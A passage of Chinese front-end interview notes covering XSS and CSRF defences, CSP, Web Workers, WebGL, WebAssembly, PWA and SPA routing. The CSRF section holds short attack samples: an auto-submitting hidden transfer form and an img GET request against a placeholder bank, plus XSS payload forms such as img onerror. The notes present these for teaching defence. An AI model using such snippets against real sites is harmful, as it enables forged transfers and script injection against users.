| **持久型 XSS（Stored XSS）**    | 恶意脚本被服务器存储（如数据库、评论区、用户资料），用户访问包含该内容的页面时自动执行。                              | 用户输入 → 服务器存储 → 所有用户加载并执行        | 论坛评论、博客留言、用户个人资料              | 影响范围广，可持续攻击所有访问该页面的用户。             |
| **反射型 XSS（Reflected XSS）** | 恶意脚本通过 URL 参数或表单提交发送给服务器，服务器未过滤直接返回页面，在当前请求中执行。                             | 用户输入（URL / 表单）→ 服务器反射 → 当前用户执行 | 搜索框、登录失败提示（如 `?msg=<script>...`） | 非持久化，仅当前请求有效，通常需要诱导用户点击恶意链接。 |
| **DOM 型 XSS（DOM-based XSS）** | 服务器不参与，前端代码直接将用户可控数据写入 DOM（如 `location.hash`、`document.write`、`innerHTML`），导致脚本执行。 | 用户输入（URL Hash 等）→ 前端 DOM 解析并执行      | 单页应用（SPA）Hash 路由、前端模板渲染        | 完全发生在浏览器端，不经过服务器，依赖前端代码漏洞。     |

---

#### 10.1.4 **XSS 危害**

- 窃取 Cookie：攻击者可以盗取用户的登录凭证。

- 钓鱼攻击：伪造登录表单，诱导用户输入密码。

- 篡改页面内容：比如插入广告或虚假信息。

- 键盘记录：监听用户的键盘输入。

- 发起 CSRF 攻击：利用 XSS 执行 CSRF 请求（后面会讲）。

---

#### 10.1.5 **XSS 防御方法**

1. **输入过滤**

- 对用户输入的特殊字符（如 `<`、`>`、`'`、`"`、`&`）进行过滤或转义，禁止输入 `<script>`、`eval()` 等危险内容；

2. **输出编码**

- 将服务器返回的用户数据 “转义为纯文本” 后再插入页面（如将 `<` 转义为 `&lt;`，`>` 转义为 `&gt;`），确保浏览器将其视为文本而非代码执行。

- 示例（输出转义后）：`&lt;script&gt;alert('xss')&lt;/script&gt;` 会被浏览器显示为文本，而非执行脚本。

```JavaScript
function escapeHtml(text) {
  return text.replace(/&/g, "&amp;")
             .replace(/</g, "&lt;")
             .replace(/>/g, "&gt;");
}
```

3. **设置 HTTP 头**

- 使用 `Content-Security-Policy (CSP)` 限制脚本来源：

  > `CSP` 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。

  ```JavaScript
  Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com
  ```

  - 这样浏览器只会执行来自 `'self'` 和 `https://trusted.cdn.com` 的脚本。

4. **使用 HttpOnly Cookie**

- 设置 `HttpOnly` 防止 JavaScript 读取 Cookie：

```JavaScript
Set-Cookie: sessionid=12345; HttpOnly; Secure
```

5. **避免直接操作 DOM**

- 禁止使用 `document.write()`、`innerHTML` 直接插入用户可控数据；若需插入，优先使用 `textContent`（`textContent` 属性会将所有输入都当作纯文本处理，不会解析其中的 HTML 标签，从而从根本上杜绝了 XSS。）或使用安全的模板引擎（如 Vue/React 的模板渲染，默认会转义用户数据）。

```JavaScript
// ❌ 危险
document.getElementById('output').innerHTML = userInput;

// ✅ 安全
document.getElementById('output').textContent = userInput;
```

`innerHTML` `innerText` `textContent`

```HTML
<div id="box">
  <span>你好</span>
  <span style="display: none;">隐藏文字</span>
</div>
```

- **`innerHTML`(HTML 内容)**

  - **读取**：返回 `"\n  <span>你好</span>\n  <span style=\"display: none;\">隐藏文字</span>\n"`。它会完整保留 HTML 标签、注释和空格。

  - **写入**：如果你写入 `<script>alert(1)</script>`，它会尝试解析。虽然现代浏览器不会直接执行 `<script>` 注入，但通过 `img src=x onerror=...` 依然可以触发 **XSS 攻击**。

- **`innerText (受样式影响的文本)`**

  - **读取**：返回 `"你好"`。

  - **特点**：

    1. **样式感知**：它模拟了用户在浏览器窗口中“看到”的内容。如果元素被 `display: none` 隐藏，它就拿不到。

    2. **性能开销**：为了判断哪些文字可见，浏览器必须计算 CSS 布局，这会触发**重排（Reflow）**，在大循环中使用时性能较差。

    3. **标准化**：曾是 IE 专属，现在虽然各大浏览器都支持，但行为在细节上（如换行符处理）仍偶有差异。

- **`textContent`(原始文本节点)**

  - **读取**：返回 `"你好 隐藏文字"`。

  - **特点**：

    1. **无视样式**：它会进入所有子节点，把所有文本拼在一起，不管它是隐藏的还是可见的。

    2. **性能最优**：它直接访问 DOM 树的文本节点，不涉及 HTML 解析和 CSS 布局计算。

    3. **语义明确**：在处理纯文本修改时，它是现代 Web 标准（DOM Level 3）中最推荐的属性。

---

### 10.2 CSRF（Cross\-Site Request Forgery，跨站请求伪造）

#### 10.2.1 **概念**

- CSRF 是利用用户已登录的状态，在不知情情况下，通过用户浏览器向受信任网站发起**伪造请求**。

- 本质：**攻击利用了用户浏览器对同源网站自动携带 Cookie 的行为**。

---

#### 10.2.2 **攻击原理**

1. 用户在银行网站登录，浏览器存储 Cookie。

2. 用户访问攻击者网站。

3. 攻击者网站发送请求（如表单提交、AJAX、图片请求）到银行网站。

4. 浏览器会自动带上 Cookie，银行服务器认为是用户发起的请求。

5. 攻击成功，用户账户被操作。

---

#### 10.2.3 **CSRF 攻击示例**

1. **表单提交**

```XML
<!-- 攻击者网页 -->
<form action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="attacker">
</form>
<script>document.forms[0].submit();</script>
```

- 用户登录银行后访问攻击页面，浏览器会携带 Cookie 自动提交请求。

2. **GET 请求**

```JavaScript
<img src="http://bank.com/transfer?amount=1000&to=attacker">
```

- 浏览器访问图片链接时，会发送带 Cookie 的 GET 请求，银行误认为是合法请求。

---

#### 10.2.4 **CSRF 危害**

- 未授权操作：

  - 转账、支付

  - 修改邮箱、密码

  - 发布内容、删除数据

- 无需获取用户密码，只利用浏览器的登录状态。

---

#### 10.2.5 如何防御 CSRF？

1. **使用 CSRF Token**

- 服务器生成一个随机 Token，放在表单或 HTTP 头中：

```JavaScript
<input type="hidden" name="csrf_token" value="随机字符串">
```

- 提交时验证 Token，不匹配则拒绝请求。

2. **SameSite Cookie**

- 设置 `SameSite` 属性，限制 Cookie 的发送范围：

```JavaScript
Set-Cookie: sessionid=12345; SameSite=Strict; Secure
```

- `SameSite=Strict`：完全禁止跨域请求携带 Cookie（即使从 A 网站跳转到 B 网站，再请求 A 也不携带）；

- `SameSite=Lax`：仅允许 “GET 方法的跨域导航请求” 携带 Cookie（如从 B 网站点击链接跳转到 A 网站），POST/PUT/DELETE 等跨域请求不携带（默认值，可阻断大部分 CSRF 攻击）；

- `SameSite=None`：允许跨域携带，但需配合 `Secure` 属性（仅 HTTPS 环境可用），适用于跨域合作场景（如第三方登录）。
  示例：`Set-Cookie: sessionId=abc123; SameSite=Lax; Secure; HttpOnly`。

3. **检查 Referer/Origin**

- 后端通过 `Referer` 或 `Origin` 请求头判断请求的来源域名：

  - `Referer`：记录请求的**来源 URL**（如从 `https://example.com` 发起的请求，Referer 为该 URL）；

  - `Origin`：仅记录**来源域名（不包含路径，比 Referer 更安全）**；

    - 因为refer中可能携带参数，携带敏感信息，可能会泄漏，所以 origin 更安全

  - 若来源域名不是目标网站的白名单域名（如银行网站仅允许 `https://bank.com`），则拒绝请求。
    注意：Referer 可被篡改，需配合其他防御措施。

```HTTP
Referer: https://example.com/transfer
Origin: https://example.com
```

4. **双重验证**

- 敏感操作（如转账）要求用户再次输入密码或验证码。

5. Token 一般存放在内存或 localStorage，配合 Authorization header，避免 CSRF

---

### 10.3 XSS 和 CSRF 的核心区别

| 特性       | XSS                                                                    | CSRF                                                                   |
| ---------- | ---------------------------------------------------------------------- | ---------------------------------------------------------------------- |
| 攻击方式   | 注入恶意脚本，在用户浏览器中执行。                                     | 利用用户已登录状态，诱导浏览器发送伪造请求。                           |
| 触发条件   | 用户访问包含恶意脚本的页面。                                           | 用户已登录目标网站，并访问攻击者构造的页面。                           |
| 攻击目标   | 浏览器端数据（如 Cookie、LocalStorage、SessionStorage 等）或页面内容。 | 服务器端操作（如转账、修改密码、删除数据等）。                         |
| 攻击者控制 | 可以执行任意 JavaScript，获取或篡改页面数据。                          | 无法执行 JavaScript（通常），只能借助浏览器自动携带身份凭证发送请求。  |
| 防御手段   | 输入过滤、输出编码、CSP、`HttpOnly` Cookie、DOMPurify 等。             | CSRF Token、`SameSite` Cookie、校验 `Origin` / `Referer`、二次验证等。 |

---

### 10.3.4 假如一个页面既使用了 Cookie 存储登录状态，又在 localStorage 保存了 Token，前端应该如何在请求中安全地携带它们？会出现哪些安全问题？

1. **Cookie 安全策略**

- `HttpOnly`：防止 JavaScript 访问 cookie，避免 XSS 窃取。

- `SameSite=Strict` / `Lax`：限制跨站请求发送 cookie，防止 CSRF。

- **只在同一站点发送 cookie**，保证浏览器不会自动带上 cookie 发起跨站请求。

2. **Token 安全策略**

- 将 token 放在 **内存或 localStorage**，通过 `Authorization` header 发送。

- 不随浏览器自动请求发送（不像 cookie），防止 CSRF。

- 但 token 存 localStorage 容易被 XSS 窃取，所以要配合 CSP \+ 前端输入验证。

3. **潜在问题**

- **XSS**：token 在 localStorage 会被恶意脚本读取

- **CSRF**：如果 cookie 设置不当，仍可能被跨站请求利用

- **混合使用**：Cookie 处理登录状态，token 处理敏感接口，两者策略要协调

> ✅ **总结**：Cookie 用于维护登录会话（受 SameSite / HttpOnly 保护），Token 用于 API 请求（放 header 避免 CSRF），同时需要前端防 XSS。

---

### 10.3.5 CSP

CSP 是一种 “通过白名单控制网页资源加载 / 执行” 的安全机制，核心用于防御 XSS 攻击，同时可防御点击劫持、恶意插件等攻击。

1. **核心作用**

- 限制脚本执行来源：仅允许白名单内的域名（如 `self` 表示当前域名、`https://cdn.example.com`）的脚本执行，阻断恶意注入的脚本（如攻击者注入的 `https://attacker.com/evil.js` 不在白名单内，无法执行）；

- 禁止不安全的资源加载：如禁止加载 HTTP 资源（仅允许 HTTPS）、禁止内联脚本（`<script>` 标签内的代码）、禁止 `eval()`/`Function()` 等动态执行代码的方式；

- 报告机制：配置 `report-uri` 或 `report-to`，可将违反 CSP 的行为上报给服务器，便于监控攻击。

2. **使用方式**

通过 HTTP 响应头（推荐，优先级高）或 HTML 元标签 配置：

- 限制可执行脚本来源（`script-src`）

- 限制样式来源（`style-src`）

- 限制图片、媒体、字体、iframe 来源等

- 阻止内联脚本（`'unsafe-inline'`）或 `eval()`

```HTTP
// HTTP 响应头配置（推荐）
Content-Security-Policy:
  default-src 'self'; // 默认所有资源仅允许当前域名
  script-src 'self' https://cdn.jsdelivr.net; // 脚本仅允许当前域名和 jsdelivr CDN
  style-src 'self' 'unsafe-inline'; // 样式允许当前域名和内联样式（unsafe-inline 需谨慎使用）
  img-src 'self' data:; // 图片允许当前域名和 data URI
  connect-src 'self'; // AJAX 请求仅允许当前域名
  report-uri /csp-report; // 违反 CSP 的行为上报到该接口
```

```HTML
<!-- HTML 元标签配置（适用于无法修改服务器响应头的场景） -->
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' https://cdn.jsdelivr.net;
  report-uri /csp-report;
">
```

## 11. Web Worker

### 11.1 核心定义

Web Worker 是一种由浏览器提供的** JavaScript API**，它允许您在网页的**后台线程**中运行脚本操作。这意味着您可以执行一些计算密集型或耗时较长的任务，而**不会阻塞主线程**（通常称为 UI 线程），从而避免用户界面（UI）变得卡顿或无响应。

---

### 11.2 为什么需要 Web Worker？

JavaScript 是单线程的。这意味着所有任务（更新UI、处理点击事件、执行计算）都在一个线程上排队执行。如果有一个任务非常耗时（例如循环处理大量数据、复杂的图像计算、加密解密），它就会**阻塞**这个唯一的线程，导致页面无法响应用户操作（点击、滚动等），直到该任务完成。这会造成很差的用户体验。

Web Worker 通过创建**后台线程**来解决这个问题，将繁重的任务从主线程中剥离出去，让主线程可以持续流畅地响应用户交互和更新UI。

---

### 11.3 Web Worker 的主要特点和限制

#### 1. 特点（能做什么）：

1. **真正的多线程**：在独立的线程中运行，与主线程并行执行。

2. **不阻塞UI**：耗时任务在Worker中运行，主线程保持流畅。

3. **通过消息通信**：Worker 线程和主线程**不能直接访问彼此的变量或DOM**。它们通过一种消息传递机制进行通信，使用 **`postMessage()`** 方法发送消息，并用 **`onmessage`** 事件处理函数来接收消息。

4. **可运行几乎所有JS代码**：可以在Worker中执行计算、使用循环、调用函数等。

#### 2. 限制（不能做什么）：

1. **无法操作DOM**：这是最重要的限制。**Worker 不能直接访问、读取或修改 HTML 文档对象模型（DOM）**。它无法使用 `document` 对象、`window` 对象等。

2. **无法访问某些全局对象**：大部分 `window` 对象的属性和方法（如 `alert`, `confirm`）在Worker上下文中是不可用的。

3. **同源限制**：Worker 脚本的URL必须与创建它的主脚本**同源**（相同协议、域名和端口）。

4. **通信数据是拷贝的**：通过 `postMessage()` 发送的数据是**值传递（拷贝）而不是引用传递**。对于大型数据（如大型数组、图像数据），这可能会带来性能开销。不过，可以使用 `Transferable Objects`（可转移对象）来转移所有权，避免拷贝开销。

---

### 11.4 Web Worker 的类型

1. **Dedicated Worker（专用Worker）**：

   - 由主脚本创建，且**只能与创建它的脚本进行通信**。

   - 是最常用的一种。

   - 如果主脚本被关闭，Worker 也会自动终止。

2. **Shared Worker（共享Worker）**：

   - 可以被多个不同的脚本（例如来自同一个源的不同浏览器窗口、iframe）共享和通信。

   - 比专用Worker更复杂，兼容性也稍差。

3. **Service Worker：**

   - 主要用于**离线缓存和网络请求拦截**。它可以**控制网页的缓存资源，并在网络不可用时提供离线体验**，是**Progressive Web App (PWA)** 的核心技术。

   - 它的生命周期和用途与 Dedicated Worker 和 Shared Worker 有显著不同。

   - 它是一个**中间人**，驻守在浏览器和网络之间。

   - 你的网页发出的所有请求（HTML, CSS, API），都要先经过它。它可以决定是去网络拉取，还是直接给浏览器返回缓存。

   - 它独立于网页存在。即使你把网页关了，它依然可以默默在后台运行（比如接收服务器推送的消息）。

   - **关键词：** 离线缓存、拦截请求、PWA（渐进式 Web 应用）。

   > **离线访问 (Offline First):**
   >
   > - 用户在地铁里没网，打开你的网页。
   > - Service Worker 拦截请求 \-\> 发现没网 \-\> 从 Cache Storage 里读出上次缓存的 HTML 和 CSS 页面 \-\> 正常展示。
   >
   > **资源预加载:**
   >
   > - 网页刚加载完，Service Worker 可以在后台悄悄把下一页的图片下载好。等用户点击下一页时，瞬间秒开。
   >
   > **Web Push (消息推送):**
   >
   > - 即使你在手机上把浏览器关了，Service Worker 还能在后台被唤醒，接收服务器的消息，并在手机通知栏弹出一个“新订单提醒”。
   >
   > **Service Worker 不是用来做重计算的！**
   >
   > - 千万别搞混。如果你在 Service Worker 里跑一个死循环或极其耗时的计算，虽然不会卡死 UI 线程，但它会**阻塞网络请求**。因为所有的请求都要经过它，如果它忙不过来，网页就加载不出来资源。
   > - _正确做法：_ 简单的逻辑放在 Service Worker，重计算扔给 Web Worker。
   >
   > **HTTPS 限制：**
   >
   > - 面试官可能会问：“本地开发没有 HTTPS 怎么调试 Service Worker？”
   > - _答案：_ `localhost` 和 `127.0.0.1` 被浏览器列为特例，允许在 HTTP 下运行 Service Worker，但上线必须是 HTTPS。
   >
   > **更新机制：**
   >
   > - Service Worker 更新很麻烦。如果你改了代码，用户刷新页面通常**不会**立即生效，需要等到所有旧页面关闭后，新的 Service Worker 才会激活（除非使用了 `skipWaiting`）。

### 11.5 如何使用 Web Worker？（一个简单示例）

1. **主线程（main\.js）代码：**

```JavaScript
// 创建一个新的 Worker，并指定后台脚本的路径
const myWorker = new Worker('worker.js');

// 向 Worker 发送消息（数据）
myWorker.postMessage('Hello, Worker! Start calculating!');

// 监听来自 Worker 的消息
myWorker.onmessage = function(e) {
  // 从事件对象 e 中获取 Worker 发送回来的数据
  const resultFromWorker = e.data;
  console.log('Message received from worker:', resultFromWorker);
  // 可以用这个结果来更新UI，例如：
  // document.getElementById('result').textContent = resultFromWorker;
};

// 主线程可以继续做其他事情，不会被Worker阻塞
console.log('Main thread continues to run...');
```

2. Worker 线程（worker\.js）代码：

```JavaScript
// 监听来自主线程的消息
onmessage = function(e) {
  console.log('Message received from main script:', e.data);

  // 模拟一个耗时计算
  let result = 0;
  for (let i = 0; i < 1000000000; i++) { // 一个很大的循环
    result += i;
  }

  // 将计算结果发送回主线程
  postMessage(result);
};
```

#### 典型应用场景

- 图像处理：在 Canvas 中处理图片像素数据（滤波、锐化等）。

- 大数据处理：排序、过滤、分析大型数据集。

- 加密/解密：执行复杂的加密算法。

- 预取和数据缓存：提前加载和预处理数据，为后续操作做准备。

- 高频率的轮询：例如不断从服务器获取数据更新。

- 语法高亮：一些复杂的代码编辑器会在Worker中进行语法分析。

## 12 WebGL

WebGL 是浏览器里的 **JavaScript 3D/2D 图形渲染 API**，底层是基于 GPU 来做图形绘制的。它不是拿来画普通 DOM 的，也不是拿来写业务表单的，而是专门用来在 `<canvas>` 上做高性能图形渲染的。很多网页里的 3D 场景、粒子效果、地图可视化、复杂图表、游戏画面，本质上都可能是用 WebGL 做出来的。

它的核心特点是：**把图形计算交给显卡**。这意味着它特别适合处理大量顶点、纹理、矩阵变换、光照、动画这些图形任务。你在 WebGL 里通常不会像操作 DOM 一样直接“创建一个圆、创建一个方块”，而是要先准备顶点数据、着色器程序、缓冲区，然后交给 GPU 去渲染。所以它相对更底层，也更接近图形学和游戏开发那一套思路。

如果你直接用原生 WebGL，会接触到很多概念，比如着色器、顶点、片元、缓冲区、坐标变换、纹理映射，这些门槛比较高。所以实际开发里很多人会用 Three\.js 这种库来封装 WebGL，降低使用难度。但不管上层封装怎么变，WebGL 本质上还是浏览器里的高性能图形渲染能力。

## 13. WebAssembly

WebAssembly，简称 WASM，是一种 **可以在浏览器里高效运行的二进制指令格式**。你可以把它理解成：除了 JavaScript 之外，浏览器又多了一种更接近底层、执行效率更高的代码运行方式。它不是用来替代整个前端开发的，而是特别适合那些性能要求高、原本用 C/C\+\+/Rust 这类语言写的模块，把它们编译成 WASM 后放到浏览器里跑。

它最常见的使用场景，是把一些**重计算、性能敏感、已有原生代码积累**的能力搬到前端，比如音视频编解码、图像处理、3D 引擎、科学计算、CAD、加密算法、游戏引擎、PDF 渲染、编译器这些。因为这些东西如果全靠普通 JS 来做，可能性能和稳定性都不太理想，而 WebAssembly 更适合承接这类任务。

使用方式上，通常不是手写一堆 WebAssembly 二进制，而是用 Rust、C、C\+\+ 之类的语言写好逻辑，再编译成 `.wasm` 文件，然后在前端里加载和调用。它本质上是给浏览器加了一层高性能计算能力，让网页不只是能跑脚本，还能跑更接近原生效率的模块。你可以把 WebAssembly 理解成：前端里的“高性能计算执行单元”。

## 14. PWA

PWA（Progressive Web App，渐进式 Web 应用） 不是一种特定的技术，而是一种理念和一套最佳实践的集合。它指的是使用现代 Web 技术（如 Service Worker、Web App Manifest 等）开发的网站，让其能**提供类似于原生移动应用（Native App）体验的 Web 应用**。

你可以把它理解为：一个网站，但它看起来、用起来、感觉起来都像一个手机 App。

它的核心目标是融合 Web 和原生应用的优势：

- Web 的优势：无需安装、易于分享（通过链接）、跨平台、始终最新。

- 原生 App 的优势：可离线使用、速度快、可添加到桌面（有图标）、有全屏体验。

1. **可靠 (Reliable)**

   - 在网络不稳定甚至完全离线的状态下，也能瞬间加载并显示内容，不会显示“恐龙游戏”那样的离线错误页面。

   - 实现技术：**Service Worker**。这是一个在浏览器后台运行的脚本，充当网络代理，可以拦截和处理网络请求，并缓存资源。

2. **快速 (Fast)**

   - 响应迅速，动画流畅，滚动顺滑，为用户提供无缝的体验。

   - 实现技术：Service Worker 的缓存机制可以让关键资源直接从本地加载，速度极快。良好的前端性能优化也是基础。

3. **沉浸式 (Engaging)**

   - 感觉像一个原生应用。**可以被用户添加到手机主屏幕**，全屏启动，没有浏览器地址栏的干扰，甚至可以接收推送通知。

   - 实现技术：**Web App Manifest**（一个 JSON 文件），它定义了应用如何显示（图标、启动画面、主题色等）。

## 15. 前端路由原理

- 前端路由的核心原理很简单：**在单页面应用（SPA）中，通过监听和改变浏览器地址（URL），动态地切换渲染不同的组件或视图，而不向服务器发起新的页面请求（无刷新）**。

  1. 事件监听：监听浏览器地址（URL）的变化。

  2. 内容替换：当 URL 发生变化时，根据预先配置的映射规则，找到对应的组件，并将其渲染到页面指定的容器中，同时隐藏或销毁之前的组件。

### 15.1 Hash 路由

它利用了 URL 中的“哈希”（`#`）部分。这个 `#` 符号以及它后面的所有内容，在 Web 标准中被称为 **“片段标识符”（Fragment Identifier）**。

**核心原理：** `URL` 中 `#` 之后的部分发生变化时，浏览器**不会**向服务器发送新的请求，页面也不会刷新。但是，这个变化会触发一个浏览器事件（`hashchange`），JavaScript 可以监听到这个事件，然后手动去更新页面上的内容。

实现原理：

1. 监听变化：通过 `window.addEventListener('hashchange', callback)` 来监听 URL 中 hash 的变化。

2. 改变 URL：通过直接赋值 `window.location.hash` 或者使用 `<a>` 标签的 `href` 属性（如 `<a href="#/about">`）来改变 hash。

3. 匹配与渲染：在 `hashchange` 事件的回调函数中，获取当前的 hash 值（如 `#/about`），根据这个值去路由映射表里找到对应的组件，然后将其渲染到页面上。

```JavaScript
// 1. 初始加载：http://example.com/
//    渲染 Home 组件

// 2. 用户点击一个链接：<a href="#/products">产品</a>
//    URL 变为：http://example.com/#/products
//    浏览器不会刷新页面，但会触发 ‘hashchange’ 事件

// 3. 我们监听到这个事件
window.addEventListener('hashchange', () => {
  // 4. 获取新的 hash (会是 ‘#/products’)
  const newHash = window.location.hash;

  // 5. 根据 hash 决定渲染哪个组件
  if (newHash === '#/products') {
    app.innerHTML = `<h1>Products Page</h1>`; // 渲染产品页组件
  } else if (newHash === '#/about') {
    app.innerHTML = `<h1>About Page</h1>`; // 渲染关于页组件
  }
  // ... 其他路由匹配
});

// 也可以用 JS 主动改变路由
function navigateTo(path) {
  window.location.hash = `#${path}`;
}
```

✅ **优点**

1. **实现简单：** 纯前端行为，不需要任何服务器端配置。

2. **兼容性好：** 兼容所有浏览器，包括非常古老的（如 IE8）。

3. **部署容易：** 无论 URL 的 `#` 后面怎么变，服务器收到的请求永远只是 `https://example.com/`。因此，你只需要让服务器能返回主 `index.html` 文件即可，不需要特殊配置。

**❌ 缺点**

1. **不够美观：** URL 中总是带着一个 `#` 符号，看起来有点“丑”和“技术化”。

2. **SEO 不友好（早期）：** 早期的搜索引擎爬虫会忽略 `#` 后面的内容，导致 SEO（搜索引擎优化）很困难。不过现在，主流搜索引擎（如 Google）已经能识别和索引 `hash` 路由了。

### 15.2 History 路由

History 路由利用了 HTML5 新增的 History API（主要是 **`history.pushState()` 和 `history.replaceState()`**），它允许开发者**直接操作浏览器的会话历史栈**。

- **核心原理：** 开发者可以调用 `history.pushState()` 或 `history.replaceState()` 来**直接修改浏览器的 URL 地址**，而**不会**触发页面刷新。

- 这种方式修改的 URL 看起来就和传统网站的 URL 一模一样。当用户点击浏览器的“前进/后退”按钮时，浏览器会触发 `popstate` 事件，JavaScript 可以监听到这个事件，然后更新页面内容。

核心 API：

- `history.pushState(state, title, url)`: 向历史栈中压入一个新的状态。**改变 URL，但不触发刷新**。

  - `state`: 一个状态对象，与新历史记录相关联。

  - `title`: (目前大多数浏览器忽略此参数，通常传空字符串 `''`)。

  - `url`: 新的 URL（必须与当前页面同源）。

- `history.replaceState(state, title, url)`: **替换当前历史栈顶的记录。同样不刷新页面**。

- `window.onpopstate` 事件：当用户点击浏览器前进/后退按钮时，或者调用 `history.back()`, `history.forward()`, `history.go()` 方法时，该事件会被触发。**注意：****`history.pushState()`**** 和 ****`history.replaceState()`**** 的调用不会触发 ****`popstate`**** 事件。**

实现原理：

1. 监听变化：主要通过 `window.addEventListener(popstate, callback)` 来监听用户的**前进/后退操作**。

2. 改变 URL：使用 **`history.pushState()` 或 `history.replaceState()`** 来改变 URL。

3. 匹配与渲染：

   - 在 `popstate` 事件的回调中，根据 `window.location.pathname` 来匹配和渲染组件。

   - 当通过程序调用 `history.pushState()` 时，它不会自动触发 `popstate` 事件，所以我们需要**在调用后手动执行一次渲染逻辑。**

```JavaScript
// 1. 初始加载：http://example.com/
//    渲染 Home 组件

// 2. 用户点击一个“程序式导航”的按钮，触发以下函数
function navigateTo(path) {
  // 3. 使用 pushState 改变 URL，不刷新页面
  history.pushState(null, '', path);
  // URL 变为：http://example.com/products

  **// 4. 因为 pushState 不会触发 popstate，所以需要手动渲染**
**  renderComponent(path);**
}

// 5. 用户点击了浏览器的“后退”按钮，从 /products 回到 /
//    这会触发 ‘popstate’ 事件
window.addEventListener('popstate', () => {
  // 6. 获取当前路径并渲染
  const currentPath = window.location.pathname; // ‘/’
  renderComponent(currentPath);
});

function renderComponent(pathname) {
  if (pathname === '/products') {
    app.innerHTML = `<h1>Products Page</h1>`;
  } else if (pathname === '/about') {
    app.innerHTML = `<h1>About Page</h1>`;
  }
  // ...
}

// 对于 <a> 标签，需要阻止默认的跳转行为，改用 history.pushState
document.addEventListener('click', (e) => {
  if (e.target.tagName === 'A' && e.target.getAttribute('href')) {
    e.preventDefault();
    const href = e.target.getAttribute('href');
    navigateTo(href);
  }
});
```

1. 用户点击链接 → 拦截默认行为 → 调用 `pushState()` → 更新视图

2. 用户前进后退 → 触发 `popstate` 事件 → 根据 URL 更新视图

3. 编程式导航 → 直接调用 `pushState()`/`replaceState()` → 更新视图

✅ **优点**

1. **URL 美观：** 地址栏看起来非常“干净”和“正常”，和普通网站一样，用户体验更好。

2. **SEO 友好：** URL 结构清晰，对搜索引擎爬虫非常友好。

❌ **缺点**

1. **需要服务器配置：** 这是 History 模式**最大的特点（和麻烦点）**。

   - **为什么？** 想象一下，你在 `https://example.com/user/profile` 这个地址上按下了**刷新**按钮（或者直接在地址栏输入这个 URL）。

   - 浏览器会认为它在请求服务器上的 `/user/profile` 这个真实的文件或目录。

   - 但对于单页面应用来说，服务器上并没有这个文件，只有一个 `index.html`。

   - 如果服务器没有特殊配置，它会返回一个 **404 Not Found** 错误。

   - **解决方案 (Nginx)：**

   ```Nginx
   location / {
     try_files $uri $uri/ /index.html;
   }
   ```

   - 这段配置的意思是：先找有没有 `/a` 这个文件，没有就找 `/a/` 这个文件夹，如果都没有，就乖乖把控制权交给 `index.html`。

2. **兼容性：** 不支持那些不支持 HTML5 History API 的老旧浏览器（不过这在今天基本不是问题）。

💡 **History 模式的解决方案**

为了解决 404 问题，你**必须**配置你的服务器（无论是 Nginx, Apache 还是 Node\.js 服务），让它对于所有“非静态资源”（不是 JS, CSS, 图片等）的请求，都 **“重定向”或者“回退”** 到你的主 `index.html` 文件。

这样一来，浏览器刷新时，服务器会返回 `index.html`，然后 `index.html` 中加载的 JavaScript 会启动，JavaScript 中的路由代码会读取当前的 URL (`/user/profile`)，并正确地渲染出对应的页面。

**replaceState的用处**

**场景一：消除 URL 里的“脏参数” \(最常用\)**

用户登录后，URL 可能会带上很丑的 Token 或 Code： `http://mysite.com/home?token=abcdefg12345`

你拿到了 Token 存好后，不想让用户看到这个参数，觉得不安全也不美观。 **怎么去掉 ****`?token=...`**** 但不刷新页面？**

**场景二：搜索/筛选功能的“防后悔”**

你在做一个电商列表页。

1. 用户点了“按价格排序” \-\> URL 变了 `?sort=price`。

2. 用户又点了“只看红色” \-\> URL 变了 `?sort=price&color=red`。

如果每次点击都用 `pushState`（追加记录），用户想回退到上一级页面（比如首页），需要疯狂点几十次“后退”按钮才能退出去。这是极其糟糕的体验。

**正确做法：** 使用 `replaceState` 更新筛选参数。这样用户点一次“后退”，就直接离开这个列表页了。

**场景三：单页应用 \(SPA\) 的路由重定向**

在 Vue Router 或 React Router 中，当你调用 `router.replace('/login')` 时，底层调用的就是 `history.replaceState`。

用途：

比如用户访问了一个需要权限的页面，你把他拦截跳转到登录页。这时应该用 replace。

- _原因：_ 登录成功后，如果用户点“后退”，不应该再回到那个“拦截页”或者是“登录页”，而应该回到进入拦截页之前的那个页面。
